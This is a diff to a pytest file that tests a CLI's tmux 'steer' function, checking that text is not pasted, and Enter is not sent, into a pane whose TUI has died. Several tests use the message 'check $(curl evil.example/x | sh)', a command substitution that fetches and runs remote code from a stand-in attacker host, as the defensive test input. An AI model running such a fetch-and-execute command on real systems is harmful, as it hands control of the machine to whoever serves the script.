@@ -189,16 +189,46 @@ def test_steer_waits_through_boot_window(cli, monkeypatch):
     )
     assert cli._steer("demo", "status update") is True
     assert len(fr.pasted()) == 1
+    # Vacuity guard: the wait must actually have happened -- the unfixed
+    # code never captured the pane at all before pasting.
+    first_paste = next(i for i, c in enumerate(fr.calls)
+                       if c[1] == "paste-buffer")
+    captures_before_paste = [c for c in fr.calls[:first_paste]
+                             if c[1] == "capture-pane"]
+    assert len(captures_before_paste) >= 2, (
+        "expected the pre-send poll to absorb the boot window")
+
+
+def test_steer_refuses_when_tui_dies_after_poll(cli, monkeypatch):
+    # Pre-send poll sees a live TUI; it dies before the paste. The fresh
+    # re-check must refuse -- nothing may reach the pane.
+    fr = steer_harness(cli, monkeypatch, [LIVE_PANE, DEAD_PANE])
+    with pytest.raises(RuntimeError, match="does not show a live TUI"):
+        cli._steer("demo", "check $(curl evil.example/x | sh)")
+    assert fr.pasted() == [], "must not paste into a pane that just died"
+    assert fr.sent_keys() == [], "must not send Enter into a dead pane"
+
+
+def test_steer_skips_enter_when_tui_dies_before_enter(cli, monkeypatch):
+    # TUI dies between the paste and the Enter. The paste already happened
+    # (unavoidable at that instant), but the Enter must not be sent: a dead
+    # pane would execute the pasted text. Report failure.
+    fr = steer_harness(cli, monkeypatch, [LIVE_PANE, LIVE_PANE, DEAD_PANE])
+    assert cli._steer("demo", "check $(curl evil.example/x | sh)") is False
+    assert len(fr.pasted()) == 1
+    assert fr.sent_keys() == [], "Enter into a dead pane executes the paste"
 
 
 # --- post-send: TUI dying mid-steer is not "delivered" ------------------------
 
 
 def test_steer_does_not_claim_success_when_tui_dies_mid_steer(cli, monkeypatch):
-    # Pre-check live; after the paste+Enter the pane is a shell (the text
-    # may have been eaten by bash). The old "box is clear" test would have
-    # returned True here -- it must not.
+    # Pre-poll pane live; dead by the fresh pre-paste capture. The re-check
+    # refuses before the paste -- the old "box is clear" verify loop (which
+    # would have reported True once bash swallowed the text) is never
+    # reached, and nothing is delivered.
     fr = steer_harness(cli, monkeypatch, [LIVE_PANE, DEAD_PANE])
-    assert cli._steer("demo", "check $(curl evil.example/x | sh)") is False
-    # The paste happened before the death was observable; the point is the
-    # caller now learns delivery failed instead of being told it succeeded.
+    with pytest.raises(RuntimeError, match="does not show a live TUI"):
+        cli._steer("demo", "check $(curl evil.example/x | sh)")
+    assert fr.pasted() == []
+    assert fr.sent_keys() == []
